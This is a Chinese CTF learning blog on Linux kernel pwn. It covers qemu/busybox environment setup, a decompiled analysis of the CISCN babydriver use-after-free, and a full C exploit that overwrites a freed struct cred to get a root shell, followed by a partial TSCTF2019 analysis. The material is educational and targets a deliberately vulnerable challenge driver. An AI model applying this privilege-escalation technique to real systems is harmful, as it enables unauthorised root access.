<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://ray-cp.github.io/archivers/qemu-pwn-cve-2019-6788%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90#%E8%A1%A5%E4%B8%81%E6%AF%94%E5%AF%B9" target="_blank" rel="noopener">qemu-pwn cve-2019-6788堆溢出漏洞分析</a></p>
]]></content>
  </entry>
  <entry>
    <title>Kernel Pwn从入门到放弃</title>
    <url>/2020/09/03/kernel/</url>
    <content><![CDATA[<h1 id="Kernel-Pwn从入门到放弃"><a href="#Kernel-Pwn从入门到放弃" class="headerlink" title="Kernel Pwn从入门到放弃"></a>Kernel Pwn从入门到放弃</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>自从上次简单地学了一下kernel之后已经很久没碰了，再捡起来发现还是蛮费劲的，还是写篇博客记录一下环境的搭建，本篇主要参考17、p4nda师兄和x3h1n师姐的博客，中间查了些别的资料，汇总成一篇大杂烩供自己翻阅hh</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>调试kernel有几种方式，真实漏洞环境大多用Vmware双机调试，或者kvm/qemu，这里介绍CTF里最常用到的qemu方式搭建kernel pwn环境。</p>
<h3 id="编译内核"><a href="#编译内核" class="headerlink" title="编译内核"></a>编译内核</h3><ol>
<li>下载指定版本的Linux内核，我是从<a href="https://mirrors.edge.kernel.org/pub/linux/kernel/" target="_blank" rel="noopener">这里</a>下载的</li>
<li><p>解压源码目录，内核编译前的配置，这里用图像化配置方式<code>make menuconfig</code>，有几个选项要勾选(默认应该都会选中)(要先安装<code>sudo apt-get install libncurses5-dev</code>)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. kernel hacking-&gt;</span><br><span class="line">Kernel debugging</span><br><span class="line">Compile-time checks and compiler options —&gt; Compile the kernel with debug info和Compile the kernel with frame pointers</span><br><span class="line">KGDB</span><br><span class="line">2. save-&gt;exit-&gt;exit</span><br></pre></td></tr></table></figure>
</li>
<li><p>make -j4(编译前可能要安装库<code>sudo apt-get install libssl-dev</code>)(编译低版本的内核需要切换低版本的gcc，方法如下)<br>3.1 <code>sudo apt-get install gcc-4.4</code><br>3.2 <code>sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-x x</code><br>3.3 <code>sudo update-alternatives --config gcc</code></p>
</li>
<li>make modules_install </li>
<li>make install </li>
</ol>
<p>之后就可以在<code>./arch/x86_64/boot/bzImage</code>下可以找到bzImage文件，从源码根目录可以拿到vmlinux(bzImage是vmlinuz经过gzip压缩的文件，适用于大内核，vmlinux是静态编译的未压缩的内核，可以在其中找ROP)</p>
<h3 id="编译busybox"><a href="#编译busybox" class="headerlink" title="编译busybox"></a>编译busybox</h3><p>启动一个Linux系统除了需要内核外还需要一些必要的命令和文件系统，busybox可以提供这样一个小型的操作系统，可以从<a href="https://busybox.net/downloads/" target="_blank" rel="noopener">官网</a>下载Busybox源码自行编译，这里我选择的是1.30.1，编译前使用<code>make menuconfig</code>将编译选项设置为静态编译<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">make menuconfig</span><br><span class="line">make make install</span><br></pre></td></tr></table></figure></p>
<p>将生成的_install 文件夹拷贝到linux kernel 源代码根目录</p>
<h3 id="生成文件系统"><a href="#生成文件系统" class="headerlink" title="生成文件系统"></a>生成文件系统</h3><p>进入_install目录，创建文件夹)(-p为不存在则创建)<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir etc</span><br><span class="line">mkdir dev</span><br><span class="line">mkdir mnt</span><br><span class="line">mkdir -p etc/init.d/</span><br><span class="line">mkdir home</span><br><span class="line">mkdir root</span><br><span class="line">touch etc/passwd</span><br><span class="line">touch etc/group</span><br></pre></td></tr></table></figure></p>
<p>创建./etc/init.d/rcS文件(可以看成系统启动的初始化文件)<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir -p /proc</span><br><span class="line">mkdir -p /tmp</span><br><span class="line">mkdir -p /sys</span><br><span class="line">mkdir -p /mnt</span><br><span class="line">/bin/mount -a</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line">echo /sbin/mdev &gt; /proc/sys/kernel/hotplug</span><br><span class="line">mdev -s</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh #normal user</span><br><span class="line">insmod vul.ko</span><br></pre></td></tr></table></figure></p>
<p><code>chmod +x rcS</code><br>创建./etc/fatab文件(用fstab可以自动挂载各种文件系统格式的硬盘、分区、可移动设备和远程设备等)<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proc /proc proc defaults 0 0</span><br><span class="line">tmpfs /tmp tmpfs defaults 0 0</span><br><span class="line">sysfs /sys sysfs defaults 0 0</span><br><span class="line">tmpfs /dev tmpfs defaults 0 0</span><br></pre></td></tr></table></figure></p>
<p>创建etc/inittab文件(在特定情况下执行的命令，如最后一条是关机的时候卸载所有挂载文件系统)<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">::sysinit:/etc/init.d/rcS</span><br><span class="line">::respawn:-/bin/sh</span><br><span class="line">::askfirst:-/bin/sh</span><br><span class="line">::ctrlaltdel:/bin/umount -a -r</span><br></pre></td></tr></table></figure></p>
<p>在dev/创建设备节点(创建两个字符设备)<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo mknod ./dev/console c 5 1</span><br><span class="line">sudo mknod ./dev/null c 1 3</span><br></pre></td></tr></table></figure></p>
<p>创建文件系统，在_install文件夹中执行<br><code>find . -print0 | cpio --null -ov --format=newc | gzip -9 &gt; ../initramfs.img</code></p>
<h3 id="qemu启动Linux-kernel"><a href="#qemu启动Linux-kernel" class="headerlink" title="qemu启动Linux kernel"></a>qemu启动Linux kernel</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">qemu-system-x86_64 -kernel ./linux-4.4.72/arch/x86_64/boot/bzImage --nographic -initrd ./busybox-1.30.1/initramfs.img -m 256M -append &quot;rdinit=./linuxrc -gdb tcp::1234 -S</span><br></pre></td></tr></table></figure>
<h3 id="gdb远程调试"><a href="#gdb远程调试" class="headerlink" title="gdb远程调试"></a>gdb远程调试</h3><p>gdb remote 127.0.0.1:1234即可，注意要先设置arch，<code>set arch i386:x86-64:intel</code>，否则会有g pack too long的报错，</p>
<h3 id="在指定内核中编写驱动程序"><a href="#在指定内核中编写驱动程序" class="headerlink" title="在指定内核中编写驱动程序"></a>在指定内核中编写驱动程序</h3><p>linux内核编译前我们用make menuconfig在源码目录生成了一个配置文件.config，这个配置文件表明了内核编译中的一些设置，比如我编译的4.4.72内核默认开启了栈保护，所以七哥栈溢出例子编译之后会有canary和NX，这个是内核决定的，因此要关闭保护只能重新编译内核和驱动(叹气)(后续：重新编译了一次，内核去掉了所有保护，但是驱动仍然有NX，放弃辽)</p>
<p>流程：建个新的文件夹，Makefile:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">obj-m := sbof.o</span><br><span class="line">ROOTDIR  := /path/to/linux/src</span><br><span class="line">PWD   := $(shell pwd)</span><br><span class="line"></span><br><span class="line">default:</span><br><span class="line">	$(MAKE) -C $(ROOTDIR) M=$(PWD) modules</span><br><span class="line">	$(CC) --static -o exploit exploit.c</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">	$(MAKE) -C $(ROOTDIR) M=$(PWD) clean</span><br><span class="line">	rm exploit</span><br></pre></td></tr></table></figure>
<p>编译完成之后放到busybox的_install里重新打包，之后就可以调试了</p>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>gdb进去之后<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file ./vmlinux</span><br><span class="line">set architecture i386:x86-64:intel</span><br><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure></p>
<p>如果给的文件里只有bzImage可以自己提取，<a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux" target="_blank" rel="noopener">脚本地址</a><br>在qemu中查看加载的程序基址<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat /sys/modules/sbof/sections/.text</span><br></pre></td></tr></table></figure></p>
<p>在gdb中添加符号文件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add-symbol-file ./sbof.ko 0xffffffc0000000</span><br></pre></td></tr></table></figure></p>
<p>查看commit_creds和prepare_kernel_cred函数的地址<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat /proc/kallsyms | grep commit_creds</span><br><span class="line">cat /proc/kallsyms | grep prepare_kernel_cred</span><br></pre></td></tr></table></figure></p>
<h3 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h3><p>/proc文件系统是一个虚拟文件系统，可以在/proc中动态创建虚拟文件，通过对虚拟文件的读写与实现与内核的通信。可以使用以下函数创建虚拟文件</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//第三个参数是文件在/proc中的位置，默认为/proc</span></span><br><span class="line"><span class="function">struct proc_dir_entry *<span class="title">create_proc_entry</span><span class="params">( <span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">mode_t</span> mode, struct proc_dir_entry *parent )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct proc_dir_entry *<span class="title">proc_create</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">umode_t</span> mode, struct proc_dir_entry *parent,<span class="keyword">const</span> struct file_operations *proc_fops)</span></span></span><br></pre></td></tr></table></figure>
<p>kptr_restrict控制/proc/kallsyms是否显示symbols的地址，通常会在init文件中给出限制：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br></pre></td></tr></table></figure></p>
<p>dmesg_restrict限制非特权用户读取dmesg信息，无法访问内核打印的消息，通常会在init文件中给出限制：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br></pre></td></tr></table></figure>
<h3 id="kernel-pwn保护机制"><a href="#kernel-pwn保护机制" class="headerlink" title="kernel pwn保护机制"></a>kernel pwn保护机制</h3><h4 id="KASLR"><a href="#KASLR" class="headerlink" title="KASLR"></a>KASLR</h4><p>内核地址随机化，相当于ASLR(并非默认启用，需要在内核命令行中加入kaslr开启)</p>
<h4 id="SMAP-SMEP"><a href="#SMAP-SMEP" class="headerlink" title="SMAP/SMEP"></a>SMAP/SMEP</h4><p>SMAP(Supervisor Mode Access Prevention，管理模式访问保护):<br>禁止内核访问用户空间的数据</p>
<p>SMEP类似于NX，即内核态无法执行shellcode,linux内核从3.0开始支持SMEP，3.7开始支持SMAP。</p>
<h4 id="Stack-Protector"><a href="#Stack-Protector" class="headerlink" title="Stack Protector"></a>Stack Protector</h4><p>在编译内核时设置CONFIG_CC_STACKPROTECTOR选项，即可开启该保护，一般而言开了这个保护再编译驱动会发现有canary。</p>
<h2 id="Kernel-UAF"><a href="#Kernel-UAF" class="headerlink" title="Kernel UAF"></a>Kernel UAF</h2><h3 id="CISCN-babydriver"><a href="#CISCN-babydriver" class="headerlink" title="CISCN-babydriver"></a>CISCN-babydriver</h3><h4 id="驱动逻辑"><a href="#驱动逻辑" class="headerlink" title="驱动逻辑"></a>驱动逻辑</h4><p>因为是第一次分析，所以写的详细一点，从_init函数开始，首先用alloc_chrdev_region函数动态分配一个设备号，成功分配的话初始化一个cdev结构体(每个字符设备对应一个结构体)，_class_create注册一个字符设备，创建相应的class，再调用device_create创建对应的设备，注意每个地方失败都会有回滚操作(destroy或者unregister)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">babydriver_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> *<span class="title">v2</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)alloc_chrdev_region(&amp;babydev_no, <span class="number">0L</span>L, <span class="number">1L</span>L, <span class="string">"babydev"</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    cdev_init(&amp;cdev_0, &amp;fops);</span><br><span class="line">    cdev_0.owner = &amp;_this_module;</span><br><span class="line">    v1 = cdev_add(&amp;cdev_0, babydev_no, <span class="number">1L</span>L);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = (class *)_class_create(&amp;_this_module, <span class="string">"babydev"</span>, &amp;babydev_no);</span><br><span class="line">      babydev_class = v2;</span><br><span class="line">      <span class="keyword">if</span> ( v2 )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = device_create(v2, <span class="number">0L</span>L, babydev_no, <span class="number">0L</span>L, <span class="string">"babydev"</span>);</span><br><span class="line">        v0 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v3 )</span><br><span class="line">          <span class="keyword">return</span> v0;</span><br><span class="line">        printk(&amp;unk_351);</span><br><span class="line">        class_destroy(babydev_class);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        printk(&amp;unk_33B);</span><br><span class="line">      &#125;</span><br><span class="line">      cdev_del(&amp;cdev_0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_327);</span><br><span class="line">    &#125;</span><br><span class="line">    unregister_chrdev_region(babydev_no, <span class="number">1L</span>L);</span><br><span class="line">    <span class="keyword">return</span> v1;</span><br><span class="line">  &#125;</span><br><span class="line">  printk(&amp;unk_309);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>_exit是设备卸载时候的会调用的，把分配的设备和class等回收。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">babydriver_exit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  device_destroy(babydev_class, babydev_no);</span><br><span class="line">  class_destroy(babydev_class);</span><br><span class="line">  cdev_del(&amp;cdev_0);</span><br><span class="line">  unregister_chrdev_region(babydev_no, <span class="number">1L</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>open函数的参数有inode和filp，每一个设备都会对应一个inode，而且是共享一个inode，这个不像filp文件指针每次打开一个设备都会创建一个新的文件指针以供操作(内核里的文件指针，跟用户态不一样)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">babyopen</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  babydev_struct.device_buf = (<span class="keyword">char</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">0x24000C0</span>LL, <span class="number">0x40</span>LL);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">0x40</span>LL;</span><br><span class="line">  printk(<span class="string">"device open\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>read函数是从内核往用户态读数据，kernel里的文件结构体定义了一组基础接口，允许开发者按照参数的标准实现一套自己的函数，read write open release(close)都是自己实现的，这里的read判断babydev_struct.device_buf不为NULL就将用户输入的第三个参数length长的数据从device_buf拷贝到Buffer里</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">babyread</span><span class="params">(file *filp, <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  result = <span class="number">-2L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_to_user(buffer);</span><br><span class="line">    result = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>write是从用户态拷贝length长的数据到babydev_struct.device_buf里，这里的IDA反汇编优点问题，看asm可以看到copy_from_user的参数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">babywrite</span><span class="params">(file *filp, <span class="keyword">const</span> <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  result = <span class="number">-2L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_from_user();</span><br><span class="line">    result = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ioctl是最简单的和设备通信的方式，开发者可以在其中根据arg参数决定对设备不同的操作，这里注意command需要是一个唯一的数字，否则可能会进行其他未知的操作，在新的标准里command是有结构的，不同的位有不同功能，这里也不深究了，如果command是0x10001，则释放device_buf，再分配一个指定size的内存地址赋给device_buf。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">babyioctl</span><span class="params">(file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> command, <span class="keyword">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, *(_QWORD *)&amp;command);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">0x10001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = (<span class="keyword">char</span> *)_kmalloc(v4, <span class="number">0x24000C0</span>LL);</span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    printk(<span class="string">"alloc done\n"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2EB);</span><br><span class="line">    result = <span class="number">-22L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>release函数调用发生在关闭设备文件的时候，这里会free掉buf</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">babyrelease</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  kfree(babydev_struct.device_buf);             <span class="comment">// exec when close(fd)</span></span><br><span class="line">  printk(<span class="string">"device release\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>这里的漏洞出现在驱动没有处理好并发，在驱动开发的时候，驱动必须是可重入的，也就是说必须是可以支持被多次打开的，这里release的kfree之后没有清空全局变量babydev_struct.device_buf，全局变量在两次打开设备文件的时候是共享的，也就是说如果我们两次打开设备，在第一次free掉buf，在第二次仍能继续读写数据。</p>
<p>最简单的利用方式是阅读该版本的linux源码，获取struct cred的大小(这里是0xa8)，在第一个设备操作中关闭文件free掉buf，再fork一个新的进程，每次fork的时候会分配一个struct cred结构体来标明进程的权限，这个结构体会将父进程的cred复制过来，分配到的恰好是我们分配的结构体(slab分配器类似fastbin的分配方式)，这时候我们在父进程里通过write修改全局变量的device_buf，实际上是修改cred，我们把uid改为0即可在子进程提权，之后在其中打开shell即可</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="keyword">void</span>        *put_addr;</span><br><span class="line">    <span class="keyword">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">kuid_t</span>      uid;        <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      gid;        <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      suid;       <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      sgid;       <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      euid;       <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      egid;       <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      fsuid;      <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      fsgid;      <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">    <span class="keyword">unsigned</span>    securebits; <span class="comment">/* SUID-less security management */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_permitted;  <span class="comment">/* caps we're permitted */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_effective;  <span class="comment">/* caps we can actually use */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_bset;   <span class="comment">/* capability bounding set */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_ambient;    <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>   jit_keyring;    <span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">                     * keys to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="keyword">void</span>        *security;  <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>   <span class="comment">/* real user ID subscription */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>  <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>        <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h4><p>exp拿c写，cred的前28个字节改为0即可，exp如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stropts.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">"/dev/babydev"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">"/dev/babydev"</span>,<span class="number">2</span>);</span><br><span class="line">    ioctl(fd1,<span class="number">0x10001</span>,<span class="number">0xa8</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line">    <span class="keyword">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">char</span> zeros[<span class="number">32</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        write(fd2,zeros,<span class="keyword">sizeof</span>(zeros));</span><br><span class="line">        <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">            system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="TSCTF2019-gt-babykernel"><a href="#TSCTF2019-gt-babykernel" class="headerlink" title="TSCTF2019-&gt;babykernel"></a>TSCTF2019-&gt;babykernel</h3><h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><p>比赛的时候没做出来，半年之后过来考古233.</p>
<p>ioctl有几个功能：</p>
<ol>
<li>cmd=<code>0x22B8</code>，往<code>BUY_LIST[arg3]</code>赋值0x123456789ABCDEF0LL</li>
<li>cmd=<code>0x271A</code>，固定分配<code>0xd0</code>的obj到<code>BUY_LIST[arg3]</code>并执行<code>*(_QWORD *)(BUY_LIST[arg33] + 8) = 0LL;</code>等赋值命令</li>
<li>cmd=<code>0x2766</code>，释放<code>BUY_LIST[arg3]</code>，这里有double free</li>
<li>cmd=<code>0x1A0A</code>，同1一样赋值<code>BUY_LIST[arg3]</code>为0xFEDCBA987654321LL</li>
</ol>
